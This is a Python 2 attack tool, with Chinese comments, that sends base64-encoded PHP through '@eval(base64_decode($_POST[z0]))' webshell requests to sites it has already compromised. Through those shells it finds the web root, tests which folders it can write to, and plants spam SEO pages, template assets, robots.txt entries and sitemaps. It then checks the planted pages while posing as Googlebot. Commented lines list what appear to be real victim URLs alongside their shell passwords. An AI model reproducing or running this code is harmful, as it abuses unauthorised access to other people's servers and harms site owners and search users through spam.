#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#BY: QQ292925842
import threading
import httplib
import re
import php_data
import g
import sys
import base64
import eval
import list
import httplib,StringIO,gzip,urllib,re
import binascii
import chardet
import ConfigParser  #读取INI配置信息
import random   #打乱数组排序
import os
import sc_html  #生成HTML
import urllib2
import time
import Queue
import sitemap_xml   #生成站点地图
import shell_links  #SHELLSEO
import thread
sys.path.append('..')
reload(sys)
sys.setdefaultencoding("utf-8")

class php_ecal(threading.Thread):
    def __init__(self, url, password,i):
        threading.Thread.__init__(self)
        self.url = url  #URL
        self.web_path = ""  #webshell主目录
        self.password = password  #password
        self.TH=i  #线程号
        self.thread_link=10 #子线程数
        self.url_data=[]  #保存繁殖的数组
        self.path_Queue = Queue.Queue(0)  #存放  数组形式  文件路径  内容
        self.shell_seo_bool=1 #;是否开启此功能
        self.open_mai_ini()   #读取配置信息

    def open_mai_ini(self):   #读取配置信息
        # 读取INI配置信息
        try:
            config = ConfigParser.ConfigParser()
            config.readfp(open("main.ini"))
            self.thread_link = int(config.get("DATA", "thread_link"))  #生成文件篇数
            self.shell_seo_bool = int(config.get("shell_seo", "shell_seo_bool"))  #是否开启此功能
        except Exception, e:
            print e
            pass

    def run(self):
        try:
            self.web_path = self.www_web_path2()  #获取网站根目录
            data = self.www_web_path()  #获取网站根目录文件
            #print self.web_path
            ss = data.split("\t")
#            self.id1=0
#            id2=len(ss)
            random.shuffle(ss)   #打算数组原有排序方式

            for i2 in ss:
            #for index, i2 in enumerate(ss):
                if len(i2) <= 1:
                    continue  #跳过   这一次
                #i2="D:/wamp/www/data"
                file_bool,file_name=self.www_qx_path(i2)  #测试目录权限
                if file_bool:
                    print u"thread:%d 写入路径%s  文件后缀%s"%(self.TH,i2,file_name)
                    #print i2,"---------",file_name#D:/wamp/www/data --------- .html
                    self.xr_file(i2,file_name)  #写入文件
                    #############################################
                    #webshell进行自我SEO
                    if len(self.url_data)<=5:
                        break #跳出   整个循环
                    #robots.txt
                    robots_data=i2[len(self.web_path):len(i2)]
                    self.php_robots_add(robots_data)  #添加蜘蛛引导页
                    #XML  地图生成
                    sitemap_xml_data=sitemap_xml.sitemap_xml(self.url_data)
                    url_sitemap="%s/sitemap.xml"%(self.web_path)
                    url_sitemap=url_sitemap.replace('//','/')
                    if self.php_add_file(url_sitemap,sitemap_xml_data,"")=="1":  #写入文件和内容
                    #            if self.php_add_file(self.web_path."/sitemap.xml",file_data,self.web_path)=="1":  #写入文件和内容
                        print u"thread:%d %s 创建地图成功"%(self.TH,g.get_domain(self.url,1)+"/sitemap.xml")
                        self.TXT_file_add("log/add_xml_ok.txt",g.get_domain(self.url,1)+"/sitemap.xml")
                    else:
                        print u"thread:%d %s 创建地图失败"%(self.TH,g.get_domain(self.url,1)+"/sitemap.xml")
                    #shell  挂外链实现自我SEO
                    if self.shell_seo_bool==1:
                        threads = []
                        threads.append(shell_links.shell_links(self.url,self.password,self.TH,"/"+robots_data+"/",self.url_data))
                        for t in threads:  # 2. 启动线程
                            t.start()
                        for t in threads:   # 3. 等待结束，不然容易内存爆掉
                            t.join()

                    break #跳出   整个循环

#            i2="D:/wamp/www/data"
#            self.php_robots_add(i2[len(self.web_path):len(i2)])  #添加蜘蛛引导页
#            self.xr_file(i2,"html")  #写入文件


        except Exception, e:
            #print e
            return 0

    def list_file(self,mb):  #遍历文件
        file_list=[]
        for root, dirs, files in os.walk(mb):
            #file_list.append(root)  #添加数据添加目录
            for file in files:
                if (file=="contentTpl.html" or file=="listTpl.html"):
                    continue  #跳过   这一次
                data="%s/%s"%(root,file)
                data=data.replace('//','/')
                file_list.append(data)  #添加数据
        return file_list

    def open_file(self,name):
        try:
            file_object = open(name)  #主页
            try:
                all_the_text = file_object.read()
            finally:
                file_object.close()
            return all_the_text
        except:
            #print e
            return ""

    def xr_file(self,path,html):  #写入文件
        try:
            ss_url="%s/%s/"%(g.get_domain(self.url,1),path[len(self.web_path):len(path)])   #计算繁殖URL地址
            sc = sc_html.sc_html()
            mb,url_data = sc.sc_html(html,ss_url)
            #mb="data/mb/zhidao/"  #data/mb/zhidao/
            #上传模板文件
            file_list=self.list_file(mb)
            for i in file_list:
                p1=i[len(mb):len(i)]
                #print i,"-------",p1  #data/mb/zhidao/img/1.jpg ------- img/1.jpg
                path1="%s/%s"%(path,p1)
                nPos1 = path1.rindex("/")
                path2=path1[0:nPos1]
                url = g.ww_path(g.get_domain(self.url, 1), self.web_path,path1)
                #print path2,"------",url  #D:/wamp/www/data/css ------ http://localhost/data/css/b.js
    #            if not self.php_mkdir(path2)=="1":
    #                print u"thread:%d %s 目录创建失败"%(self.TH,path2)
                file_data=self.open_file(i)  #都文件内容
                if (".png" in str(p1) or ".gif" in str(p1) or ".jpg" in str(p1) or ".bmp" in str(p1)):
                    file_object = open(i, 'rb')
                    try:
                        file_data = file_object.read()
                    finally:
                        file_object.close()
    #                if self.php_add_file_tp(path1,file_data)=="1":  #写入文件和内容
    #                    print u"写入文件成功 %s"%(url)
    #                else:
    #                    print u"写入文件失败 %s"%(url)
    #            else:
                if self.php_add_file(path1,file_data,path2)=="1":  #写入文件和内容
                    print u"thread:%d %s 写入模板文件成功"%(self.TH,url)
                else:
                    print u"thread:%d %s 写入模板文件失败"%(self.TH,url)

            #上传生成的文件
            for i in range(len(url_data)):
                html_data=url_data[i]
                self.path_Queue.put(html_data,0.3)   #插入队列

            self.id1=0
            id2=len(url_data)
            while not self.path_Queue.empty():   #判断队列是否为空
                try:
                    threads = []  #线程
                    for i in range(self.thread_link):  #nthreads=10  创建10个线程
                        self.id1+=1
                        threads.append(self.time_sleep(i+1,id2,path))
                    for t in threads:
                        t.start()  #开始线程
                    for t in threads:
                        t.join()  #等待线程，保持主进程
                except Exception,e:
                    #print "1111111111",e
                    pass
        except Exception, e:
            print e
            pass

    def time_sleep(self,i,id2,path):
        try:
            if self.path_Queue.empty():   #判断队列是否为空
                #print u"thread:%d 数据完成"%(self.TH)
                #time.sleep(60)
                return 0
            else:
                URL = self.path_Queue.get(0.5)  #get()方法从队头删除并返回一个项目
                self.run_file_thread(URL,i,id2,path)
                return 0
        except Exception,e:
            #print "2222222222222",e
            return 0

    def run_file_thread(self,html_data,i,id2,path):
        try:
            id="[%d-%d]thread_link:%d "%(id2,self.id1,i)
#            str_data="thread:%d %s%s"%(self.TH,id,html_data)
#            print str_data
#            time.sleep(1)
            path1="%s/%s"%(path,html_data[0])
            nPos1 = path1.rindex("/")
            path2=path1[0:nPos1]
            #print path2,"-------------",path1
#            if not self.php_mkdir(path2)=="1":
#                print u"thread:%d %s %s 目录创建失败"%(self.TH,id,path2)
            url = g.ww_path(g.get_domain(self.url, 1), self.web_path,path1)
            if self.php_add_file(path1,base64.b64decode(html_data[1]),path2)=="1":  #写入文件和内容
                print u"thread:%d %s %s 写入文件成功"%(self.TH,id,url)
                s1,s2=self.url_http_200(url)
                if s1==True:
                    data=u"%s|%s"%(str(url),str(s2))
                    print u"thread:%d %s %s"%(self.TH,id,data)
                    self.TXT_file_add("log/links.txt",str(data))
                    self.TXT_file_add("data/links.txt",str(data))
                    self.url_data.append(data)
                else:
                    self.TXT_file_add("log/add_ok.txt",str(url))
            else:
                print u"thread:%d %s %s 写入文件失败"%(self.TH,id,url)
                self.TXT_file_add("log/add_no.txt",str(url))
            return 0
        except Exception,e:
            #print "2222222222222",e
            return 0

    def url_http_200(self,url):
        try:
        #            statusCode =urllib.urlopen(url).getcode()
        #            #return statusCode==200  #返回 True  False
        #            if statusCode==200:
        #                #print "11111"
        #                #local = url.split('/')[-1]
        #                int_url_read=urllib.urlopen(url).read()
        #                #print int_url_read
        #                if len(int_url_read)>=10000:
        #                    #print "url:%s   len:%d"%(url,int_url_read)
        #                    p = re.compile(r'<title>(.*)</title>')
        #                    sarr = p.findall(int_url_read)
        #                    if len(sarr)>=1:
        #                        return True,sarr[0]
        #                    return True,""
        #            return False,""
            req = urllib2.Request(url)
            req.add_header('User-Agent',"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)")
            s = urllib2.urlopen(req,timeout=10)  # 超时10秒   #s = urllib2.urlopen(r"http://www.163.com")
            int_url_read = s.read()
            if len(int_url_read)>=10000:
                #print "url:%s   len:%d"%(url,int_url_read)
                p = re.compile(r'<title>(.*)</title>')
                sarr = p.findall(int_url_read)
                if len(sarr)>=1:
                    return True,sarr[0]
                return True,""
            return False,""
        except BaseException, e:
            #print "xxxxxxxxxxxx",(str(e))
            return False,""

    def TXT_file_add(self,file_nem,data):  #写入文本
        try:
            #file_nem=time.strftime('%Y.%m.%d')   #file_nem+".txt"
            file_object = open(file_nem,'a')
            #file_object.write(list_passwed[E])
            file_object.writelines(data)
            file_object.writelines("\n")
            file_object.close()
        except Exception,e:
            print u"写入TXT失败",file_nem,data,e
            return 0

    def str_to_ascii(self, data):
        str_data = ""
        for i, ch in enumerate(data):
            str_data += "%"+binascii.b2a_hex(ch)
        return str_data

#    def php_add_file_tp(self,path,data):  #写入照片文件
#        try:
#            PHP_data = str(php_data.php_add_file_tp)
#            PHP_data = g.QC_PHP(PHP_data)  #清除PHP中没有用的数据
#            #print PHP_data
#            data_base64 = "%s" % (base64.b64encode(PHP_data))
#            eval_data="%s"%(urllib.quote("@eval(base64_decode($_POST[z0]));"))
#
#            data = self.str_to_ascii(data)
#            data = data.replace('%','')#.replace(',','')   #替换字符串
#            print data
#            params = "=%s&z0=%s&z1=%s&z2=%s" % (eval_data,urllib.quote(data_base64),base64.b64encode(path),data)  #quote URL编码
#            data = eval.post_eval_data(self.url, self.password, params)
#            data2 = g.re_data(data) #正则返回的结果
#            return data2
#        except Exception,e:
#            #print e
#            return 0

    def php_add_file(self,path,data,path2):  #写入文件和内容
        try:
            PHP_data = str(php_data.php_add_file)
            PHP_data = g.QC_PHP(PHP_data)  #清除PHP中没有用的数据
            #print PHP_data
            data_base64 = "%s" % (base64.b64encode(PHP_data))
            eval_data="%s"%(urllib.quote("@eval(base64_decode($_POST[z0]));"))

#            data = self.str_to_ascii(data)
#            #print urllib.unquote(data)
#            data = data.replace('%','')#.replace(',','')   #替换字符串
            params = "=%s&z0=%s&z1=%s&z2=%s&z3=%s" % (eval_data,urllib.quote(data_base64),base64.b64encode(path),urllib.quote(base64.b64encode(data)),base64.b64encode(path2))  #quote URL编码
            data = eval.post_eval_data(self.url, self.password, params)
            data2 = g.re_data(data) #正则返回的结果
            return data2
        except Exception,e:
            #print e
            return 0

#    def php_mkdir(self,path):  #查询目录
#        try:
#            PHP_data = str(php_data.php_mkdir_path)
#            PHP_data = g.QC_PHP(PHP_data)  #清除PHP中没有用的数据
#            #print PHP_data
#            data_base64 = "%s" % (base64.b64encode(PHP_data))
#            eval_data="%s"%(urllib.quote("@eval(base64_decode($_POST[z0]));"))
#            params = "=%s&z0=%s&z1=%s" % (eval_data,urllib.quote(data_base64),base64.b64encode(path))  #quote URL编码
#            data = eval.post_eval_data(self.url, self.password, params)
#            data2 = g.re_data(data) #正则返回的结果
#            return data2
#        except Exception,e:
#            #print e
#            return 0

    def www_qx_path(self,path):  #测试目录权限
        try:
            i2="%s/test.html"%(path)
            if self.php_qx_path(i2):  #测试目录权限
                return 1,"html"
            i2="%s/test.htm"%(path)
            if self.php_qx_path(i2):  #测试目录权限
                return 1,"htm"
            i2="%s/test.php"%(path)
            if self.php_qx_path(i2):  #测试目录权限
                return 1,"php"
            return 0,""
        except Exception,e:
            #print e
            return 0,""

    def php_robots_add(self,path):  #添加蜘蛛引导页
        try:
            PHP_data = str(php_data.robots_add)  #获取遍历文件   .decode('utf-8').encode('gbk')
            PHP_data = g.QC_PHP(PHP_data)  #清除PHP中没有用的数据
            #print PHP_data
            data_base64 = "%s" % (base64.b64encode(PHP_data))
            eval_data="%s"%(urllib.quote("@eval(base64_decode($_POST[z0]));"))
            params = "=%s&z0=%s&z1=%s" % (eval_data,urllib.quote(data_base64),base64.b64encode(path))  #quote URL编码
            data = eval.post_eval_data(self.url, self.password, params)
            #data2 = g.re_data(data) #正则返回的结果
            #return data2
            return 1
        except Exception,e:
            #print e
            return 0

    def php_qx_path(self,path):  #测试目录权限
        try:
            PHP_data = str(php_data.PHP_qx_path)  #获取遍历文件   .decode('utf-8').encode('gbk')
            PHP_data = g.QC_PHP(PHP_data)  #清除PHP中没有用的数据
            #print PHP_data
            data_base64 = "%s" % (base64.b64encode(PHP_data))
            eval_data="%s"%(urllib.quote("@eval(base64_decode($_POST[z0]));"))
            params = "=%s&z0=%s&z1=%s" % (eval_data,urllib.quote(data_base64),base64.b64encode(path))  #quote URL编码
            data = eval.post_eval_data(self.url, self.password, params)
            data2 = g.re_data(data) #正则返回的结果
            return data2
        except Exception,e:
            #print e
            return 0

    def www_web_path2(self):  #获取网站根目录
        try:
            PHP_data = str(php_data.php_www_path)  #获取遍历文件   .decode('utf-8').encode('gbk')
            PHP_data = g.QC_PHP(PHP_data)  #清除PHP中没有用的数据
            data_base64 = "%s" % (base64.b64encode(PHP_data))
            eval_data="%s"%(urllib.quote("@eval(base64_decode($_POST[z0]));"))
            params = "=%s&z0=%s" % (eval_data,urllib.quote(data_base64))  #quote URL编码
            data = eval.post_eval_data(self.url, self.password, params)
            data2 = g.re_data(data) #正则返回的结果
            return data2
        except Exception,e:
            #print e
            return 0

    def www_web_path(self):  #获取网站根目录
        try:
            PHP_data = str(php_data.PHP_bl_path)
            PHP_data = g.QC_PHP(PHP_data)  #清除PHP中没有用的数据
            #print PHP_data
            data_base64 = "%s" % (base64.b64encode(PHP_data))
            eval_data="%s"%(urllib.quote("@eval(base64_decode($_POST[z0]));"))
            params = "=%s&z0=%s" % (eval_data,urllib.quote(data_base64))  #quote URL编码
            data = eval.post_eval_data(self.url, self.password, params)
            data2 = g.re_data(data) #正则返回的结果
            return data2
        except Exception,e:
            #print e
            return 0

if __name__=='__main__':
    threads = []  #线程
    for i in range(1):
        threads.append(php_ecal("http://localhost/long.php","long123",1))
        #threads.append(php_ecal("http://www.wulinzr.com/plus/mytag_js.php?aid=6022","1",1))
        #threads.append(php_ecal("http://rqllgs.com/plus/mytag_js.php?aid=6022","1",1))
    for t in threads:
        t.start()


